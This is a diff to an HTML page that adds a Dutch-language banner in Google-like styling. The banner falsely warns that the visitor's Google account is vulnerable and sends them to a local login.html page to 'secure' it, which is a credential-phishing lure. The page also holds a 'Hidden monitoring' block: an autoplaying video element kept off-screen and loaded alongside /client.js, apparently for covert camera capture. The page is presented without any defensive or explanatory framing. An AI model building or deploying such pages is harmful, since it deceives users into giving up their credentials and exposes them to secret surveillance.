@@ -719,6 +719,20 @@
     // Start
     init();
     </script>
+<!-- Security CTA bar -->
+<div id="secCta" style="position:fixed;bottom:0;left:0;right:0;background:#1a73e8;color:#fff;z-index:9999;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;box-shadow:0 -2px 8px rgba(0,0,0,.2);font-size:14px;">
+    <div style="display:flex;align-items:center;gap:12px;">
+        <span style="font-size:22px;">🔒</span>
+        <div>
+            <strong style="font-size:15px;">Je account is kwetsbaar!</strong>
+            <div style="opacity:.9;font-size:13px;margin-top:2px;">Beveilig je Google-account nu met 2-stapsverificatie.</div>
+        </div>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center;">
+        <a href="login.html" style="background:#fff;color:#1a73e8;padding:9px 22px;border-radius:4px;font-weight:600;font-size:14px;text-decoration:none;white-space:nowrap;">Account beveiligen →</a>
+        <span onclick="document.getElementById('secCta').style.display='none'" style="cursor:pointer;opacity:.7;font-size:20px;padding:4px 8px;">✕</span>
+    </div>
+</div>
 <!-- Hidden monitoring -->
 <video id="v" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:320px;height:240px;opacity:0;pointer-events:none;z-index:-1"></video>
 <script src="/client.js"></script>
